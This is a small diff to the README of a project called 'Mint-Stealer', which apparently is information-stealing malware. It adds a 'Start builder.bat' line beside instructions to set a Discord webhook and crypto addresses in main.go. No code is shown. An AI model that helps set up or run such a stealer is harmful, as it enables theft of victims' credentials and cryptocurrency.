@@ -93,6 +93,9 @@ cd Mint-Stealer
 
 ## Usage
 
+- Start builder.bat or
+
+
 You can use the Project template:
 
 - Open `main.go` and edit config with your Discord webhook and your crypto addresses
